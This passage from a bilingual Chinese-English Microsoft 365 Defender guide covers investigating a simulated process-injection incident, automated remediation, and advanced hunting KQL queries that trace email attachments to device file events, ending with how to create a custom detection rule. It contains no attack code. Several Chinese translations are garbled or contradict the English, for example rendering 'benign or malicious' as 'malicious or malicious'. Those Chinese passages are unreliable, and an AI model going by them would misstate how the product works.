![具有行为的设备时间线屏幕截图](../../media/mtp/fig11.png)

<span data-ttu-id="7d333-228">展开一些更有趣的行为可提供有用的详细信息，例如进程树。</span><span class="sxs-lookup"><span data-stu-id="7d333-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="7d333-229">例如，向下滚动，直到找到警报事件"可疑 **进程注入已观测到"。**</span><span class="sxs-lookup"><span data-stu-id="7d333-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="7d333-230">选择 **powershell.exe** 以notepad.exe进程事件，以在侧窗格的"事件实体"图下显示此行为的完整进程树。 </span><span class="sxs-lookup"><span data-stu-id="7d333-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="7d333-231">如有必要，使用搜索栏进行筛选。</span><span class="sxs-lookup"><span data-stu-id="7d333-231">Use the search bar for filtering if necessary.</span></span>

![所选 PowerShell 文件创建行为的进程树屏幕截图](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="7d333-233">查看用户信息 [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="7d333-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="7d333-234">在事件页面上，选择" **用户** "选项卡以显示攻击所涉及的用户列表。</span><span class="sxs-lookup"><span data-stu-id="7d333-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="7d333-235">该表包含有关每个用户的其他信息，包括每个用户的调查 **优先级** 分数。</span><span class="sxs-lookup"><span data-stu-id="7d333-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="7d333-236">选择用户名以打开用户配置文件页，可在其中执行进一步调查。</span><span class="sxs-lookup"><span data-stu-id="7d333-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="7d333-237">[阅读更多有关调查有风险的用户。](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="7d333-237">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![用户云应用安全屏幕截图](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="7d333-239">自动调查和修复</span><span class="sxs-lookup"><span data-stu-id="7d333-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="7d333-240">在我们演示此模拟之前，请观看以下视频，以熟悉什么是自动自我修复、在门户中在哪里找到它，以及它在安全操作中如何提供帮助：</span><span class="sxs-lookup"><span data-stu-id="7d333-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="7d333-241">在安全中心门户中Microsoft 365事件。</span><span class="sxs-lookup"><span data-stu-id="7d333-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="7d333-242">" **事件"** 页中的"调查 **"选项卡显示** 由 Microsoft Defender for Identity 和 Microsoft Defender for Endpoint 触发的自动调查。</span><span class="sxs-lookup"><span data-stu-id="7d333-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="7d333-243">以下屏幕截图仅显示 Defender for Endpoint 触发的自动调查。</span><span class="sxs-lookup"><span data-stu-id="7d333-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="7d333-244">默认情况下，Defender for Endpoint 会自动修正队列中找到的项目，这需要进行修正。</span><span class="sxs-lookup"><span data-stu-id="7d333-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![与事件相关的自动调查的屏幕截图](../../media/mtp/fig14.png)

<span data-ttu-id="7d333-246">选择触发调查的警报以打开" **调查详细信息"** 页。</span><span class="sxs-lookup"><span data-stu-id="7d333-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="7d333-247">你将看到以下详细信息：</span><span class="sxs-lookup"><span data-stu-id="7d333-247">You'll see the following details:</span></span>

- <span data-ttu-id="7d333-248">警报 (自动) 调查的警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="7d333-249">影响的用户和设备。</span><span class="sxs-lookup"><span data-stu-id="7d333-249">Impacted users and devices.</span></span> <span data-ttu-id="7d333-250">如果在其他设备上找到指示器，这些附加设备也将列出。</span><span class="sxs-lookup"><span data-stu-id="7d333-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="7d333-251">证据列表。</span><span class="sxs-lookup"><span data-stu-id="7d333-251">List of evidence.</span></span> <span data-ttu-id="7d333-252">找到并分析的实体，如文件、进程、服务、驱动程序和网络地址。</span><span class="sxs-lookup"><span data-stu-id="7d333-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="7d333-253">将分析这些实体与警报的可能关系，并评分为恶意或恶意。</span><span class="sxs-lookup"><span data-stu-id="7d333-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="7d333-254">找到的威胁。</span><span class="sxs-lookup"><span data-stu-id="7d333-254">Threats found.</span></span> <span data-ttu-id="7d333-255">在调查过程中发现的已知威胁。</span><span class="sxs-lookup"><span data-stu-id="7d333-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-256">根据时间，自动调查可能仍在运行。</span><span class="sxs-lookup"><span data-stu-id="7d333-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="7d333-257">请等待几分钟，等待该过程完成，然后收集并分析证据并查看结果。</span><span class="sxs-lookup"><span data-stu-id="7d333-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="7d333-258">刷新 **"调查详细信息** "页，获取最新结果。</span><span class="sxs-lookup"><span data-stu-id="7d333-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

!["调查详细信息"页的屏幕截图](../../media/mtp/fig15.png)

<span data-ttu-id="7d333-260">在自动调查期间，Microsoft Defender for Endpoint 确定了notepad.exe，该流程作为需要修正的项目之一注入。</span><span class="sxs-lookup"><span data-stu-id="7d333-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="7d333-261">作为自动修正的一部分，Defender for Endpoint 会自动停止可疑进程注入。</span><span class="sxs-lookup"><span data-stu-id="7d333-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="7d333-262">你可以看到 <i>notepad.exe在 </i> 测试设备上正在运行的进程列表中消失。</span><span class="sxs-lookup"><span data-stu-id="7d333-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="7d333-263">解决事件</span><span class="sxs-lookup"><span data-stu-id="7d333-263">Resolve the incident</span></span>

<span data-ttu-id="7d333-264">完成调查并确认要修正后，关闭事件。</span><span class="sxs-lookup"><span data-stu-id="7d333-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="7d333-265">选择 **"管理事件"。**</span><span class="sxs-lookup"><span data-stu-id="7d333-265">Select **Manage incident**.</span></span> <span data-ttu-id="7d333-266">将状态设置为 **"解决事件"** 并选择相关分类。</span><span class="sxs-lookup"><span data-stu-id="7d333-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="7d333-267">事件解决后，它将关闭安全中心和相关门户Microsoft 365警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

!["事件"页面的屏幕截图，其中打开"管理事件"面板，可在其中单击开关来解决事件](../../media/mtp/fig16.png)

<span data-ttu-id="7d333-269">这为事件管理和自动调查和修正方案封装了攻击模拟。</span><span class="sxs-lookup"><span data-stu-id="7d333-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="7d333-270">下一次模拟将让你通过主动威胁搜寻潜在恶意文件。</span><span class="sxs-lookup"><span data-stu-id="7d333-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="7d333-271">高级搜寻方案</span><span class="sxs-lookup"><span data-stu-id="7d333-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-272">在我们演示模拟之前，请观看以下视频，了解高级搜寻概念，了解可在门户中查找它的地方，并了解它可以如何帮助你执行安全操作：</span><span class="sxs-lookup"><span data-stu-id="7d333-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="7d333-273">搜寻环境要求</span><span class="sxs-lookup"><span data-stu-id="7d333-273">Hunting environment requirements</span></span>

<span data-ttu-id="7d333-274">此方案需要单个内部邮箱和设备。</span><span class="sxs-lookup"><span data-stu-id="7d333-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="7d333-275">你还需要一个外部电子邮件帐户来发送测试邮件。</span><span class="sxs-lookup"><span data-stu-id="7d333-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="7d333-276">验证租户是否已启用[Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="7d333-276">Verify that your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>
2. <span data-ttu-id="7d333-277">确定用于接收电子邮件的目标邮箱。</span><span class="sxs-lookup"><span data-stu-id="7d333-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="7d333-278">a.</span><span class="sxs-lookup"><span data-stu-id="7d333-278">a.</span></span> <span data-ttu-id="7d333-279">Microsoft Defender 必须监视此邮箱，Office 365 b。</span><span class="sxs-lookup"><span data-stu-id="7d333-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="7d333-280">要求 3 中的设备需要访问此邮箱</span><span class="sxs-lookup"><span data-stu-id="7d333-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="7d333-281">配置测试设备：a.</span><span class="sxs-lookup"><span data-stu-id="7d333-281">Configure a test device: a.</span></span> <span data-ttu-id="7d333-282">确保使用的是 Windows 10 1903 或更高版本。</span><span class="sxs-lookup"><span data-stu-id="7d333-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="7d333-283">b.</span><span class="sxs-lookup"><span data-stu-id="7d333-283">b.</span></span> <span data-ttu-id="7d333-284">将测试设备加入测试域。</span><span class="sxs-lookup"><span data-stu-id="7d333-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="7d333-285">c.</span><span class="sxs-lookup"><span data-stu-id="7d333-285">c.</span></span> <span data-ttu-id="7d333-286">[打开"Windows Defender 防病毒"。](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="7d333-286">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7d333-287">如果无法启用Windows Defender 防病毒，请参阅[此疑难解答主题](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="7d333-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="7d333-288">d.</span><span class="sxs-lookup"><span data-stu-id="7d333-288">d.</span></span> <span data-ttu-id="7d333-289">[载入到 Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="7d333-289">[Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="7d333-290">运行模拟</span><span class="sxs-lookup"><span data-stu-id="7d333-290">Run the simulation</span></span>

1. <span data-ttu-id="7d333-291">从外部电子邮件帐户，将电子邮件发送到测试环境要求部分的步骤 2 中标识的邮箱。</span><span class="sxs-lookup"><span data-stu-id="7d333-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="7d333-292">包括任何现有电子邮件筛选器策略允许的附件。</span><span class="sxs-lookup"><span data-stu-id="7d333-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="7d333-293">此文件不需要是恶意文件或可执行文件。</span><span class="sxs-lookup"><span data-stu-id="7d333-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="7d333-294">建议的文件类型包括.pdf、.exe(（如果) ）或Office Word 文件等文档。 <i> </i> <i></i></span><span class="sxs-lookup"><span data-stu-id="7d333-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="7d333-295">打开从设备发送的电子邮件，如测试环境要求部分的步骤 3 中的定义。</span><span class="sxs-lookup"><span data-stu-id="7d333-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="7d333-296">打开附件或将文件保存到设备。</span><span class="sxs-lookup"><span data-stu-id="7d333-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="7d333-297">转到搜寻</span><span class="sxs-lookup"><span data-stu-id="7d333-297">Go hunting</span></span>

1. <span data-ttu-id="7d333-298">打开 security.microsoft.com 门户。</span><span class="sxs-lookup"><span data-stu-id="7d333-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="7d333-299">导航到 **"搜寻>高级搜寻"。**</span><span class="sxs-lookup"><span data-stu-id="7d333-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![M365 安全中心门户导航栏中高级搜寻的屏幕截图](../../media/mtp/fig17.png)

3. <span data-ttu-id="7d333-301">生成一个查询，该查询从收集电子邮件事件开始。</span><span class="sxs-lookup"><span data-stu-id="7d333-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="7d333-302">从查询窗格中，选择"新建"。</span><span class="sxs-lookup"><span data-stu-id="7d333-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="7d333-303">双击架构中的 EmailEvents 表。</span><span class="sxs-lookup"><span data-stu-id="7d333-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="7d333-304">将时间范围更改为过去 24 小时。</span><span class="sxs-lookup"><span data-stu-id="7d333-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="7d333-305">假设你运行上述模拟时发送的电子邮件是过去 24 小时发送的，否则请更改时间范围。</span><span class="sxs-lookup"><span data-stu-id="7d333-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![你可以更改时间范围的屏幕截图。](../../media/mtp/fig18.png)

   1. <span data-ttu-id="7d333-308">运行查询。</span><span class="sxs-lookup"><span data-stu-id="7d333-308">Run the query.</span></span> <span data-ttu-id="7d333-309">根据试点的环境，你可能会获得许多结果。</span><span class="sxs-lookup"><span data-stu-id="7d333-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="7d333-310">有关限制数据返回的筛选选项，请参阅下一步。</span><span class="sxs-lookup"><span data-stu-id="7d333-310">See the next step for filtering options to limit data return.</span></span>

      ![高级搜寻查询结果的屏幕截图](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="7d333-312">高级搜寻将查询结果显示为表格数据。</span><span class="sxs-lookup"><span data-stu-id="7d333-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="7d333-313">还可以选择查看其他格式类型（如图表）的数据。</span><span class="sxs-lookup"><span data-stu-id="7d333-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="7d333-314">查看结果，并查看能否识别打开的电子邮件。</span><span class="sxs-lookup"><span data-stu-id="7d333-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="7d333-315">可能需要 2 小时才能在高级搜寻中显示消息。</span><span class="sxs-lookup"><span data-stu-id="7d333-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="7d333-316">如果电子邮件环境很大并且有很多结果，您可能需要使用"显示筛选器" **选项查找邮件** 。</span><span class="sxs-lookup"><span data-stu-id="7d333-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="7d333-317">在示例中，电子邮件发送自 Yahoo 帐户。</span><span class="sxs-lookup"><span data-stu-id="7d333-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="7d333-318">单击 **+** SenderFromDomain **yahoo.com** 旁边的图标，然后单击"应用"将所选域添加到查询。</span><span class="sxs-lookup"><span data-stu-id="7d333-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="7d333-319">使用运行模拟的步骤 1 中用于发送测试邮件的域或电子邮件帐户筛选结果。</span><span class="sxs-lookup"><span data-stu-id="7d333-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="7d333-320">再次运行查询，获取较小的结果集验证是否从模拟中看到消息。</span><span class="sxs-lookup"><span data-stu-id="7d333-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![筛选器的屏幕截图。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="7d333-323">单击查询中的结果行，以便可以检查记录。</span><span class="sxs-lookup"><span data-stu-id="7d333-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![选中高级搜寻结果时打开的检查记录侧面板的屏幕截图](../../media/mtp/fig21.png)

4. <span data-ttu-id="7d333-325">现在，你已验证是否可以看到电子邮件，请为附件添加筛选器。</span><span class="sxs-lookup"><span data-stu-id="7d333-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="7d333-326">重点关注环境中具有附件的所有电子邮件。</span><span class="sxs-lookup"><span data-stu-id="7d333-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="7d333-327">对于此方案，重点关注入站电子邮件，而不是从你的环境发送的电子邮件。</span><span class="sxs-lookup"><span data-stu-id="7d333-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="7d333-328">删除已添加的任何筛选器以查找邮件并添加"|其中 **AttachmentCount > 0** 和 **EmailDirection**  ==  **"Inbound""**</span><span class="sxs-lookup"><span data-stu-id="7d333-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="7d333-329">下面的查询将显示结果，其列表比针对所有电子邮件事件的初始查询短：</span><span class="sxs-lookup"><span data-stu-id="7d333-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. <span data-ttu-id="7d333-330">接下来，包括有关附件 (，例如：文件名、哈希) 到结果集。</span><span class="sxs-lookup"><span data-stu-id="7d333-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="7d333-331">为此，请加入 **EmailAttachmentInfo** 表。</span><span class="sxs-lookup"><span data-stu-id="7d333-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="7d333-332">要用于联接的常用字段是 **NetworkMessageId** 和 **RecipientObjectId**。</span><span class="sxs-lookup"><span data-stu-id="7d333-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="7d333-333">以下查询还包括一个附加行"| **项目重命名 EmailTimestamp=Timestamp**"，有助于确定与电子邮件相关的时间戳与下一步将添加的文件操作相关的时间戳。</span><span class="sxs-lookup"><span data-stu-id="7d333-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="7d333-334">接下来，使用 **EmailAttachmentInfo** 表中的 **SHA256** 值查找在终结点上发生的 **DeviceFileEvents** (文件操作，) 哈希。</span><span class="sxs-lookup"><span data-stu-id="7d333-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="7d333-335">此处的常用字段是附件的 SHA256 哈希。</span><span class="sxs-lookup"><span data-stu-id="7d333-335">The common field here will be the SHA256 hash for the attachment.</span></span>

   <span data-ttu-id="7d333-336">生成的表现在包含终结点 (Microsoft Defender for Endpoint) 的详细信息，例如设备名称、在此例中 (已执行哪些操作、已筛选为仅包括 FileCreated) 事件和存储文件的位置。</span><span class="sxs-lookup"><span data-stu-id="7d333-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="7d333-337">还将包含与进程关联的帐户名称。</span><span class="sxs-lookup"><span data-stu-id="7d333-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="7d333-338">现在，你已创建一个查询，该查询将标识用户打开或保存附件的所有入站电子邮件。</span><span class="sxs-lookup"><span data-stu-id="7d333-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="7d333-339">您还可以优化此查询以筛选特定的发件人域、文件大小、文件类型等。</span><span class="sxs-lookup"><span data-stu-id="7d333-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7. <span data-ttu-id="7d333-340">函数是一种特殊类型的联接，它让你可以拉取关于文件的更多 TI 数据，如其普遍程度、签名者和颁发者信息等。若要获取有关文件的更多详细信息，请使用 **FileProfile** () 函数扩充：</span><span class="sxs-lookup"><span data-stu-id="7d333-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="7d333-341">创建检测</span><span class="sxs-lookup"><span data-stu-id="7d333-341">Create a detection</span></span>

<span data-ttu-id="7d333-342">创建一个查询，用于标识要在将来是否发生警报的信息，然后可以从该查询创建自定义检测。</span><span class="sxs-lookup"><span data-stu-id="7d333-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

<span data-ttu-id="7d333-343">自定义检测将按照您设置的频率运行查询，并且查询结果将基于您选择的影响资产创建安全警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="7d333-344">这些警报将关联到事件，并可以像其中一个产品生成任何其他安全警报一样进行会审。</span><span class="sxs-lookup"><span data-stu-id="7d333-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="7d333-345">在查询页面上，删除在"开始"搜寻说明的步骤 7 中添加的第 7 行和第 8 行，然后单击"**创建检测规则"。**</span><span class="sxs-lookup"><span data-stu-id="7d333-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![Screenshot of where you can click create detection rule in the advanced hunting page](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="7d333-347">如果单击 **"创建检测规则** "，并且查询中出现语法错误，将不会保存检测规则。</span><span class="sxs-lookup"><span data-stu-id="7d333-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="7d333-348">仔细检查查询以确保没有错误。</span><span class="sxs-lookup"><span data-stu-id="7d333-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="7d333-349">使用允许安全团队了解警报的信息、生成警报的原因以及预期他们执行哪些操作，填写必填字段。</span><span class="sxs-lookup"><span data-stu-id="7d333-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

   ![可在其中定义警报详细信息的创建检测规则页面的屏幕截图](../../media/mtp/fig23.png)

   <span data-ttu-id="7d333-351">确保清楚填写字段，以帮助向下一位用户告知有关此检测规则警报的明智决定</span><span class="sxs-lookup"><span data-stu-id="7d333-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="7d333-352">选择此警报中影响的实体。</span><span class="sxs-lookup"><span data-stu-id="7d333-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="7d333-353">在这种情况下，请选择"**设备和** 邮箱 **"。**</span><span class="sxs-lookup"><span data-stu-id="7d333-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![创建检测规则页面的屏幕截图，您可以在其中选择受影响实体的参数](../../media/mtp/fig24.png)

4. <span data-ttu-id="7d333-355">确定触发警报时应执行哪些操作。</span><span class="sxs-lookup"><span data-stu-id="7d333-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="7d333-356">在这种情况下，请运行防病毒扫描，但可能会执行其他操作。</span><span class="sxs-lookup"><span data-stu-id="7d333-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![创建检测规则页面的屏幕截图，可在触发警报以帮助解决威胁时运行防病毒扫描](../../media/mtp/fig25.png)

5. <span data-ttu-id="7d333-358">选择警报规则的范围。</span><span class="sxs-lookup"><span data-stu-id="7d333-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="7d333-359">由于此查询涉及设备，因此设备组根据 Microsoft Defender for Endpoint 上下文在此自定义检测中相关。</span><span class="sxs-lookup"><span data-stu-id="7d333-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="7d333-360">创建不包含设备作为受影响实体的自定义检测时，范围不适用。</span><span class="sxs-lookup"><span data-stu-id="7d333-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![创建检测规则页面的屏幕截图，可在其中设置警报规则的范围，以管理对你将看到的结果的预期](../../media/mtp/fig26.png)

   <span data-ttu-id="7d333-362">对于此试点，你可能希望将此规则限制为生产环境中的测试设备的子集。</span><span class="sxs-lookup"><span data-stu-id="7d333-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="7d333-363">选择“**创建**”。</span><span class="sxs-lookup"><span data-stu-id="7d333-363">Select **Create**.</span></span> <span data-ttu-id="7d333-364">然后，从 **导航面板中选择** "自定义检测规则"。</span><span class="sxs-lookup"><span data-stu-id="7d333-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![菜单中的"自定义检测规则"选项的屏幕截图](../../media/mtp/fig27a.png)

   ![显示规则和执行详细信息的检测规则页面的屏幕截图](../../media/mtp/fig27b.png)

   <span data-ttu-id="7d333-367">在此页中，可以选择将打开详细信息页面的检测规则。</span><span class="sxs-lookup"><span data-stu-id="7d333-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![电子邮件附件页面的屏幕截图，可在其中查看规则执行的状态、触发的警报和操作、编辑检测等](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="7d333-369">其他高级搜寻演练练习</span><span class="sxs-lookup"><span data-stu-id="7d333-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="7d333-370">若要详细了解高级搜寻，以下 Web 广播将演练 Microsoft 365 Defender 中高级搜寻的功能，以创建跨支柱查询、透视实体以及创建自定义检测和修正操作。</span><span class="sxs-lookup"><span data-stu-id="7d333-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-371">请准备好自己的GitHub帐户，以在试点测试实验室环境中运行搜寻查询。</span><span class="sxs-lookup"><span data-stu-id="7d333-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

